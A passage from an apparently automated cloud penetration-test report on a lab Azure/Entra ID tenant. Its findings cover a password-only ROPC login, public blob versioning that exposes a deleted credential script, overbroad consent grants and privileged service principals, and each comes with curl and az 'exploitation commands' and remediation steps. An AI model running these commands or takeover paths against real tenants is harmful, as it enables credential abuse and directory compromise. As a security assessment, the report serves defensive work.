ROPC authentication returned an access_token with amr=[\"pwd\"] confirming password-only authentication with no MFA challenge. Token scopes include Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, Directory.AccessAsUser.All among others.

#### Exploitation Commands

```bash
curl -s --connect-timeout 15 -X POST \"https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token\" -d \"grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default&username=marcus@megabigtech.com&password=[REDACTED_CREDENTIAL]\"
```

#### Remediation

1. Immediately rotate marcus@megabigtech.com password. 2. Enable MFA for ALL users via Conditional Access. 3. Block legacy authentication protocols (ROPC). 4. Review the AllPrincipals admin consent grant providing Application.ReadWrite.All to Azure PowerShell client. 5. Implement Conditional Access policies requiring compliant devices and MFA for all sign-ins.

---

### 3.10 — Service Principal with Privileged Authentication Administrator Role - Tenant Takeover Risk

| Field | Value |
|-------|-------|
| **ID** | `vuln_3058d2` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098.001` — Account Manipulation: Additional Cloud Credentials |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.[REDACTED]...` |
| **Component** | it-helpdesk-app Service Principal |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T11:59:09Z |

#### Description

The service principal 'it-helpdesk-app' (SP ID: f1f44e35-6047-42e9-852d-41d841189bc9, App ID: 7ddf4787-e8da-46ea-830d-5d571ec32dd2) holds the Privileged Authentication Administrator directory role (roleTemplateId: 7be44c8a-adaf-4e2a-84d6-ab2649e08a13). This role can reset passwords of ALL users including Global Administrators. The application has 1 password credential. An attacker who obtains this credential (or injects a new one via Application.ReadWrite.All, which Marcus's token has) can authenticate as the SP, reset any Global Admin's password, and fully compromise the tenant.

#### Technical Analysis

The it-helpdesk-app service principal has been assigned Privileged Authentication Administrator, one of the most powerful roles in Entra ID. This role can reset authentication methods (including passwords) of ANY user including Global Administrators, making it a direct tenant takeover primitive. The application has an existing password credential, meaning anyone who obtains or injects a credential can authenticate as this SP and escalate to Global Admin by resetting an admin's password.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.[REDACTED]?$expand=principal" | jq '.value[] | select(.roleDefinitionId=="7be44c8a-adaf-4e2a-84d6-ab2649e08a13")'
```

#### Evidence / Logs

```
Role assignment: roleDefinitionId=7be44c8a-adaf-4e2a-84d6-ab2649e08a13 (Privileged Authentication Administrator), principalId=f1f44e35-6047-42e9-852d-41d841189bc9, principal=it-helpdesk-app
Application it-helpdesk-app (appId: 7ddf4787-e8da-46ea-830d-5d571ec32dd2) has 1 password credential
```

#### Remediation

1. Remove the Privileged Authentication Administrator role from the it-helpdesk-app service principal. 2. Assign a least-privilege role like Helpdesk Administrator instead. 3. Audit who has access to this application's credentials. 4. Implement Conditional Access policies restricting service principal sign-ins.

---

### 3.11 — Overprivileged Admin-Consented OAuth Grant - Application.ReadWrite.All + Directory.ReadWrite.All for All Principals

| Field | Value |
|-------|-------|
| **ID** | `vuln_57144a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1550.001` — Use Alternate Authentication Material: Application Access Token |
| **ISO 27001** | `A.9.4.1` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/oauth2PermissionGrants` |
| **Component** | OAuth2 Permission Grant - AllPrincipals |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T12:02:12Z |

#### Description

An OAuth2 permission grant with consentType 'AllPrincipals' (admin-consented for all users) was discovered for client SP 7176f94c. This grant includes extremely dangerous delegated permissions: Application.ReadWrite.All, User.ReadWrite.All, Group.ReadWrite.All, Directory.ReadWrite.All, Directory.AccessAsUser.All, AuditLog.Read.All, IdentityRiskyUser.ReadWrite.All, UserAuthenticationMethod.Read.All, RoleManagement.Read.Directory, and Policy.Read.All. Any user who authenticates through this application automatically receives these permissions without individual consent. This is a tenant takeover primitive — any authenticated user can modify applications, read/write all users, and access the entire directory.

#### Technical Analysis

An admin has granted extremely broad delegated permissions (including Application.ReadWrite.All, Directory.ReadWrite.All, User.ReadWrite.All) to a client application with consentType=AllPrincipals. This means every user in the tenant automatically has these permissions available when authenticating through this application — no individual consent prompt is required. This effectively turns any valid user credential into a full directory read/write token, dramatically lowering the barrier for privilege escalation. Combined with ROPC authentication working without MFA, any stolen user password can immediately be weaponized for full tenant compromise.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" | jq '.value[] | select(.clientId=="7176f94c-6797-4cea-b5a6-172aeddf7d14" and .consentType=="AllPrincipals")'
```

#### Evidence / Logs

```
OAuth2 permission grant: clientId=7176f94c-6797-4cea-b5a6-172aeddf7d14, consentType=AllPrincipals, scope=Application.ReadWrite.All User.Read.All Group.ReadWrite.All Directory.ReadWrite.All Directory.AccessAsUser.All offline_access profile openid Directory.Read.All Reports.Read.All Policy.Read.All Organization.Read.All RoleManagement.Read.Directory GroupMember.Read.All PrivilegedEligibilitySchedule.Read.AzureADGroup IdentityRiskyUser.Read.All AuditLog.Read.All IdentityRiskyUser.ReadWrite.All User
```

#### Remediation

1. Review and revoke the AllPrincipals consent grant for this application immediately. 2. Replace with per-user consent or reduce the scopes to minimum required. 3. Enable admin consent workflow requiring approval. 4. Disable user consent for applications entirely via Entra ID settings. 5. Audit all AllPrincipals consent grants regularly.

---

### 3.12 — Azure Blob Versioning Exposes Deleted Sensitive Files to Anonymous Users

| Field | Value |
|-------|-------|
| **ID** | `vuln_b3c5e1` |
| **Severity** | HIGH |
| **CVSS Score** | 8.6 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.10 - Information deletion` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=l...` |
| **Component** | Azure Blob Storage Versioning |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T11:41:29Z |

#### Description

Azure Blob Storage versioning is enabled on the 'mbtwebsite' storage account with public access on the $web container. This combination allows anonymous users to enumerate ALL blob versions including deleted/overwritten blobs using the include=versions parameter. The basic listing (comp=list without include=versions) returns 15 blobs (current versions only). The versioned listing reveals the additional deleted blob 'scripts-transfer.zip' (VersionId: 2025-08-07T21:08:03.6678148Z) which is not visible in the current listing because it was deleted. The blob was uploaded on Aug 7, 2025 and subsequently deleted, but the version remains downloadable. This is the Azure equivalent of 'dumpster diving' - deleted files persist as versions and remain accessible through the public API.

#### Technical Analysis

When Azure Blob Storage versioning is enabled alongside public container access, deleted blobs remain accessible through their version IDs. The standard blob listing shows 15 current blobs, but adding the include=versions parameter reveals 16 entries including the deleted 'scripts-transfer.zip'. While the current blob endpoint returns BlobNotFound (confirming deletion), the versioned URL with versionId parameter successfully downloads the file. This design flaw means that uploading a sensitive file to a public container and subsequently deleting it does NOT remove public access - the version persists and is enumerable. This is particularly dangerous for temporary file transfers or accidental uploads of credentials.

#### Exploitation Commands

```bash
curl -s -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list" | grep -c "<Name>"\ncurl -s -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions" | grep -c "<Name>"\ncurl -s "https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip" (returns BlobNotFound - deleted)\ncurl -s -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zi
```

#### Raw Request

```http
GET /$web?restype=container&comp=list&include=versions HTTP/1.1\nHost: mbtwebsite.blob.core.windows.net\nx-ms-version: 2019-12-12
```

#### Raw Response

```http
200 OK - XML response containing 16 blob entries including:\n<Blob><Name>scripts-transfer.zip</Name><VersionId>2025-08-07T21:08:03.6678148Z</VersionId><Properties>...<Content-Length>1484</Content-Length><Content-Type>application/zip</Content-Type>...</Properties></Blob>\n(No <IsCurrentVersion> tag = deleted/non-current version)
```

#### Evidence / Logs

```
Basic listing: 15 blobs (all current versions)\nVersioned listing: 16 entries (includes deleted scripts-transfer.zip)\nscripts-transfer.zip current: HTTP 404 BlobNotFound (deleted)\nscripts-transfer.zip version: HTTP 200 OK, 1484 bytes (recoverable)\nDelta: 1 deleted blob recovered via versioning
```

#### Remediation

1. Permanently delete all versions of sensitive blobs: az storage blob delete --container-name '$web' --name scripts-transfer.zip --account-name mbtwebsite --version-id 2025-08-07T21:08:03.6678148Z. 2. Disable blob versioning if not operationally required: az storage account blob-service-properties update --account-name mbtwebsite --enable-versioning false. 3. Set container access to Private. 4. Implement lifecycle management policies to automatically purge old versions.

---

### 3.13 — Azure Blob Versioning Exposes Deleted Files to Anonymous Users

| Field | Value |
|-------|-------|
| **ID** | `vuln_ce044f` |
| **Severity** | HIGH |
| **CVSS Score** | 8.6 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.10 - Information deletion` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=l...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T11:43:12Z |

#### Description

The combination of blob versioning enabled on storage account mbtwebsite with anonymous public access on the $web container creates a critical misconfiguration. Even after a blob is 'deleted', all previous versions remain accessible to unauthenticated users via the include=versions parameter on the List Blobs API. This defeats the security expectation that deleting a file removes it from public access, creating a false sense of security for operators who believe deleted content is no longer exposed.

#### Technical Analysis

The version listing endpoint returns scripts-transfer.zip with its VersionId despite being deleted. The blob was downloadable using the versionId query parameter without authentication, proving deleted files are not truly removed when versioning is active on a public container.

#### Exploitation Commands

```bash
curl -s --connect-timeout 15 -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/\\$web?restype=container&comp=list&include=versions"
```

#### Remediation

1. Disable anonymous public access on the storage account or container. 2. Implement lifecycle management policies to hard-delete blob versions after a short retention period. 3. Use permanent delete (hard delete) for sensitive files rather than soft delete. 4. Audit all versioned blobs for sensitive content. 5. Consider using Azure Private Endpoints for storage access.

---

### 3.14 — Excessive Global Administrator Accounts - 6 Users with Tenant-Level Control

| Field | Value |
|-------|-------|
| **ID** | `vuln_897ddb` |
| **Severity** | HIGH |
| **CVSS Score** | 8.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.[REDACTED]...` |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T11:59:39Z |

#### Description

Six user accounts hold the Global Administrator role (62e90394-69f5-4237-9190-012177145e10): Ian Austin, Felipe Garcia, Ayush Singh, Filip Jodoin, Bruce, and Mike Jones. Microsoft recommends a maximum of 2-4 Global Administrators. Excessive Global Admin accounts dramatically expand the attack surface as each represents a full tenant compromise if their credentials are obtained. None of these accounts appear to have MFA enforced (given Marcus's passwordless ROPC login worked without MFA).

#### Technical Analysis

The tenant has 6 Global Administrator accounts, which is well above Microsoft's recommended maximum of 2-4. Each Global Administrator has unrestricted access to the entire tenant including all Azure subscriptions, all user accounts, all application registrations, and all data. The broad attack surface is compounded by the lack of MFA enforcement demonstrated by the ROPC authentication success for the marcus account. If any of these 6 accounts has a weak or leaked password, the tenant is fully compromised.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.[REDACTED]?$expand=principal" | jq '.value[] | select(.roleDefinitionId=="62e90394-69f5-4237-9190-012177145e10")'
```

#### Evidence / Logs

```
Global Admin assignments:
1. Ian Austin (18600f1a-3cee-434e-860f-aff4078da055)
2. Felipe Garcia (2527f79a-4466-4876-8118-5ae59b2b7c2f)
3. Ayush Singh (33745286-f1d3-4124-b04c-452f9c1b90e6)
4. Filip Jodoin (81499b01-ac78-4b12-91e7-824c199231d0)
5. Bruce (a3a1a558-8dcc-4ceb-a602-060f897ba633)
6. Mike Jones (ef62b4a7-a96c-463a-8482-573c3b03ca02)
```

#### Remediation

1. Reduce Global Administrator accounts to 2-4 maximum. 2. Assign least-privilege roles to accounts that don't need full admin access. 3. Enforce MFA for all privileged accounts. 4. Implement PIM (Privileged Identity Management) for just-in-time access.

---

### 3.15 — Azure Blob Storage Container Publicly Accessible - Anonymous List & Read ($web)

| Field | Value |
|-------|-------|
| **ID** | `vuln_7a542b` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.3 - Information classification and handling` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=l...` |
| **Component** | Azure Blob Storage - $web container |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T11:39:29Z |

#### Description

The Azure Blob Storage container '$web' for storage account 'mbtwebsite' is configured with public access level allowing anonymous blob listing and reading. Any unauthenticated user can enumerate all blobs in the container using the Azure Blob REST API with the comp=list parameter. This includes full metadata (creation time, modification time, content type, size, ETags) for all 16 blobs. The container hosts a static website (Mega Big Tech) accessible via https://dev.megabigtech.com. Public list access exposes the complete directory structure and all file names, enabling targeted download of sensitive files.

#### Technical Analysis

The Azure Blob Storage container '$web' for storage account 'mbtwebsite' allows anonymous listing of all blobs without any authentication. A simple unauthenticated curl request to the container's REST API endpoint with restype=container&comp=list returns a full XML enumeration of all 16 blobs including their names, version IDs, sizes, content types, ETags, and timestamps. This is a significant misconfiguration as it exposes the complete contents of the container to any unauthenticated attacker, enabling targeted download of sensitive files.

#### Exploitation Commands

```bash
curl -s --connect-timeout 15 -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list"
```

#### Raw Request

```http
GET /$web?restype=container&comp=list HTTP/1.1\nHost: mbtwebsite.blob.core.windows.net\nx-ms-version: 2019-12-12
```

#### Raw Response

```http
HTTP/1.1 200 OK\nContent-Type: application/xml\n\n<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://mbtwebsite.blob.core.windows.net/" ContainerName="$web"><Blobs><Blob><Name>index.html</Name>...</Blob><Blob><Name>scripts-transfer.zip</Name><VersionId>2025-08-07T21:08:03.6678148Z</VersionId>...</Blob>... (16 blobs total)</Blobs></EnumerationResults>
```

#### Evidence / Logs

```
HTTP 200 OK - Full XML listing returned with 16 blobs\nBlobs found: index.html, scripts-transfer.zip, static/application-*.css, static/common.js.download, static/css, static/iframe_api, static/jquery-3.6.0.min.js.download, static/js, static/magnific-popup*.css, static/magnific-popup*.js.download, static/player.js.download, static/swiper*.css, static/swiper*.js.download, static/util.js.download, static/www-widgetapi.js.download
```

#### Remediation

Set the container access level to 'Private' in Azure portal or via CLI: az storage container set-permission --name '$web' --public-access off --account-name mbtwebsite. Use Shared Access Signatures (SAS) or Azure AD authentication for authorized access only.

---

### 3.16 — Azure Blob Storage $web Container Allows Anonymous Listing and Read

| Field | Value |
|-------|-------|
| **ID** | `vuln_c62e3f` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.3 - Information access restriction` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=l...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T11:42:27Z |

#### Description

The Azure Blob Storage container $web on storage account mbtwebsite allows anonymous listing (comp=list) and read access. An unauthenticated attacker can enumerate all blobs in the container including their names, sizes, content types, and version IDs. This exposes the full directory structure of the static website and enables further attacks such as version enumeration.

#### Technical Analysis

Anonymous GET request to the container list endpoint returns XML with all 16 blob names, sizes, content types, and metadata without any authentication. The container's public access level permits unauthenticated enumeration.

#### Exploitation Commands

```bash
curl -s --connect-timeout 15 -H "x-ms-version: 2019-12-12" "https://mbtwebsite.blob.core.windows.net/\$web?restype=container&comp=list"
```

#### Remediation

Set the container public access level to 'Private' (no anonymous access). Use Azure CDN or Azure Front Door with origin access identity/private link to serve static website content. Enable storage account firewall rules to restrict access by IP/VNet.

---

### 3.17 — Hardcoded Credential Leaked in Azure Blob Storage (Deleted Blob Recovery)

| Field | Value |
|-------|-------|
| **ID** | `vuln_7e0f9d` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://mbtwebsite.blob.core.windows.net (scripts-transfer.zip)` |
| **Component** | Azure Blob Storage / scripts-transfer.zip |
| **Discovered by** | `entraid` |
| **Discovered at** | 2026-08-02T11:47:49Z |

#### Description

A plaintext credential (password: [REDACTED_CREDENTIAL]) was recovered from a deleted blob (scripts-transfer.zip) in the mbtwebsite Azure Storage account. The script used ROPC (Resource Owner Password Credential) flow with the Azure PowerShell public client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46) to authenticate and enumerate Microsoft Graph /v1.0/users. The credential targets tenant megabigtech.com (tenant ID: 2590ccef-687d-493b-ae8d-441cbab63a72). The password '[REDACTED_CREDENTIAL]' is a weak, human-memorable password that fails complexity best practices. Recovery of this blob from soft-deleted storage demonstrates that Azure Blob soft-delete retains sensitive data that should have been permanently purged.

#### Technical Analysis

A deleted Azure Blob (scripts-transfer.zip) was recovered from the mbtwebsite storage account through Azure's soft-delete feature. The blob contained a script that used the OAuth2 Resource Owner Password Credential (ROPC) flow to authenticate to Microsoft Entra ID using the Azure PowerShell public client application and a hardcoded plaintext password. This represents a significant credential exposure because: (1) the password was stored in plaintext in a script, (2) the blob was supposedly deleted but remained recoverable, and (3) the script was designed to enumerate tenant users via Microsoft Graph, indicating reconnaissance or automation activity.

#### Exploitation Commands

```bash
az storage blob list --container-name [container] --account-name mbtwebsite --include d
az storage blob download --container-name [container] --name scripts-transfer.zip --account-name mbtwebsite
```

#### Evidence / Logs

```
Deleted blob scripts-transfer.zip recovered from mbtwebsite storage account
Contains ROPC authentication script with hardcoded password: [REDACTED_CREDENTIAL]
Client ID: 04b07795-8ddb-461a-bbee-02f9e1bf7b46 (Azure PowerShell public client)
Tenant: common (megabigtech.com)
Target: Microsoft Graph /v1.0/users enumeration
```

#### Remediation

1. Permanently purge the deleted blob to prevent further recovery. 2. Rotate the compromised password immediately. 3. Disable or restrict soft-delete retention for containers storing sensitive scripts. 4. Implement Azure Key Vault for credential storage instead of hardcoding in scripts. 5. Enable Conditional Access policies to block ROPC flow. 6. Audit storage account access logs to identify who created and accessed the blob.

---

### 3.18 — Application with 62 Password Credentials - Excessive Credential Sprawl

| Field | Value |
|-------|-------|
| **ID** | `vuln_46d799` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/applications/ab743eea-102d-486f-8b76-...` |
| **Component** | daiki-appspn Application Registration |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T11:59:21Z |

#### Description

The application 'daiki-appspn' (Object ID: ab743eea-102d-486f-8b76-b833180694c3, App ID: 3626d80c-9f3b-48f9-a445-65a1ad9129af) has 62 password credentials configured. This extreme credential sprawl indicates password credentials are being added without rotation or cleanup. Each credential is a valid authentication path to the service principal. Any leaked credential grants access to whatever permissions this SP holds.

#### Technical Analysis

The daiki-appspn application has accumulated 62 separate password credentials. This is far beyond any normal operational need and suggests automated credential generation without lifecycle management. Each password credential is a separate key that can authenticate as the service principal. Given the compromised user Marcus has Application.ReadWrite.All scope, the password hints and metadata of these credentials are readable, and new credentials can be injected.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName,passwordCredentials" | jq '.value[] | select(.displayName=="daiki-appspn")'
```

#### Evidence / Logs

```
Application daiki-appspn: id=ab743eea-102d-486f-8b76-b833180694c3, appId=3626d80c-9f3b-48f9-a445-65a1ad9129af, passwordCredentials count=62
```

#### Remediation

1. Immediately audit all 62 credentials and remove unused ones. 2. Implement credential rotation policies. 3. Switch to certificate-based authentication or managed identities. 4. Set up alerts for credential additions on service principals.

---

### 3.19 — Hybrid Tenant with Active On-Premises Sync - AD-to-Cloud Escalation Path

| Field | Value |
|-------|-------|
| **ID** | `vuln_841151` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1550.003` — Use Alternate Authentication Material: Pass the Ticket |
| **ISO 27001** | `A.9.4.1` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/organization` |
| **Component** | Microsoft Entra Connect / Hybrid Identity |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T11:59:59Z |

#### Description

The tenant has on-premises directory synchronization enabled (onPremisesSyncEnabled: true) with the last sync at 2026-08-02T11:37:15Z (minutes ago). The Entra Connect sync account (0f2c0bb3-d24f-49ad-a352-0bf24c56fc12) holds the Hybrid Identity Administrator role. The ConnectSyncProvisioning application (appId: 472d0fcb-3410-448c-a8a5-87370db8c4d3) has 2 key credentials. Multiple users (Akira Suzuki, Amelia Jones, Hana Takahashi, Jack Donnely, James Johnson, Michelle Stuart) show onPremisesSyncEnabled=true, confirming hybrid identity. An on-premises AD compromise propagates to Entra ID via password hash sync (PHS) or pass-through auth (PTA).

#### Technical Analysis

The megabigtech.com tenant runs active Entra Connect synchronization from an on-premises Active Directory environment. The sync server is named DCNY02 (from the app name ConnectSyncProvisioning_DCNY02_8668877016c3), indicating it is a domain controller in New York. This hybrid architecture means that compromising on-premises Active Directory (e.g., obtaining the AZUREADSSOACC$ computer account's Kerberos key for Seamless SSO, or the AD DS connector account for PHS) would propagate credentials to the cloud and enable full Entra ID takeover.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/organization" | jq '.value[0] | {onPremisesSyncEnabled, onPremisesLastSyncDateTime}'
```

#### Evidence / Logs

```
Organization: onPremisesSyncEnabled=true, onPremisesLastSyncDateTime=2026-08-02T11:37:15Z
Entra Connect user: id=0f2c0bb3-d24f-49ad-a352-0bf24c56fc12, role=Hybrid Identity Administrator
ConnectSyncProvisioning_DCNY02 app: 2 key credentials
Synced users: Akira Suzuki, Amelia Jones, Hana Takahashi, Jack Donnely, James Johnson, Michelle Stuart
```

#### Remediation

1. Secure the Entra Connect server (DCNY02) as a Tier 0 asset. 2. Enable PHS for backup but use PTA with monitoring. 3. Rotate the AZUREADSSOACC$ Kerberos decryption key regularly. 4. Monitor the sync account for suspicious activities. 5. Consider cloud-only break-glass accounts.

---

### 3.20 — Full Directory Enumeration via Leaked Credential - Complete Tenant User/Group/App Inventory Exposed

| Field | Value |
|-------|-------|
| **ID** | `vuln_6b0256` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.9.2.1` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/users` |
| **Discovered by** | `entra` |
| **Discovered at** | 2026-08-02T12:00:19Z |

#### Description

Using the leaked credential for marcus@megabigtech.com (recovered from a deleted Azure Blob), complete enumeration of the tenant was achieved: 60+ users, 35+ groups (including role-assignable groups EXECUTIVE, Archive, CUSTOMER-DATABASE-ACCESS, DEVICE-ADMINS, IT-HELPDESK), 50+ application registrations, 31 activated directory roles, and all role assignments. The token grants User.Read.All, Group.ReadWrite.All, Application.ReadWrite.All, and Directory.AccessAsUser.All scopes, exposing the full identity graph of the organization. A flag value was found in Marcus's jobTitle field: 39c6217c4a28ba7f3198e5542f9e50c4.

#### Technical Analysis

The credential discovered in a deleted Azure Blob provides full read access to the megabigtech.com Entra ID directory. The enumeration revealed the complete organizational structure including service accounts, administrative accounts, hybrid-synced accounts, and guest accounts. The flag in Marcus's jobTitle confirms this is a penetration testing target. The broad delegated scopes (Application.ReadWrite.All, Directory.AccessAsUser.All) mean this single credential provides not just read access but write access to applications, groups, and user properties across the entire tenant.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/me" | jq .
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users" | jq '.value | length'
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups" | jq '.value | length'
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/applications" | jq '.value | length'
```

#### Evidence / Logs

```
Marcus Hutch profile: id=41c178d3-c246-4c00-98f0-8113bd631676, jobTitle="Flag: 39c6217c4a28ba7f3198e5542f9e50c4"
Users enumerated: 60+ (paginated)
Groups enumerated: 35+ (EXECUTIVE, IT, ALGO-ACCESS, KV WRITERS, STORAGE WRITERS, etc.)
Applications enumerated: 50+
Directory roles: 31 activated
Notable service accounts: Entra Connect, Automation account, Backups Admin, Finance Team, Azure Service Firewall Cloudshell User
Guest account: Guy Tremblay (gtremblay_admin_protonmail.com#EXT#@megabigtech.onmicrosoft.com)
```

#### Remediation

1. Rotate Marcus's password immediately. 2. Revoke all active sessions. 3. Audit Azure Blob storage for other credential leaks. 4. Implement soft-delete monitoring for sensitive data. 5. Review and reduce delegated permissions on the Azure CLI first-party app consent.

---

### 3.21 — Full Entra ID Directory Enumerated - 1124 Objects Including Users, Groups, Apps, Roles

| Field | Value |
|-------|-------|
| **ID** | `vuln_c85ca6` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.8.3 - Information access restriction` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/users, /groups, /applications, /servi...` |
| **Discovered by** | `entra-id` |
| **Discovered at** | 2026-08-02T12:04:35Z |

#### Description

Using Marcus's compromised token, the full Entra ID directory was enumerated: all users (including synced on-prem users), all groups (including security-sensitive groups like EXECUTIVE, CUSTOMER-DATABASE-ACCESS, ALGO-ACCESS, SERVER-BACKUPS), all applications with their credential counts (daiki-appspn has 62 password credentials), all service principals and their role assignments. The tenant is a hybrid environment synced from megabigtech.local via Azure AD Connect on server DCNY02. Verified domains include megabigtech.com, international-am.com, and multiple .onmicrosoft.com domains.

#### Technical Analysis

Microsoft Graph API calls returned complete directory information including all user accounts, group memberships, application registrations with credential metadata, service principal role assignments, and directory role definitions. Flag value 39c6217c4a28ba7f3198e5542f9e50c4 found in marcus's jobTitle field.

#### Exploitation Commands

```bash
curl -s -H \"Authorization: Bearer TOKEN\" \"https://graph.microsoft.com/v1.0/users\"\ncurl -s -H \"Authorization: Bearer TOKEN\" \"https://graph.microsoft.com/v1.0/groups\"\ncurl -s -H \"Authorization: Bearer TOKEN\" \"https://graph.microsoft.com/v1.0/applications\"\ncurl -s -H \"Authorization: Bearer TOKEN\" \"https://graph.microsoft.com/v1.[REDACTED]\"
```

#### Remediation

1. Restrict Microsoft Graph API permissions using Conditional Access App Control. 2. Remove overly broad admin consent grants. 3. Implement user and group visibility restrictions. 4. Enable Entra ID Protection risk-based policies. 5. Monitor for bulk enumeration patterns in sign-in and audit logs.

---

### 3.22 — ROPC (Resource Owner Password Credential) Flow Enabled on Tenant

| Field | Value |
|-------|-------|
| **ID** | `vuln_a04235` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.9 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` |
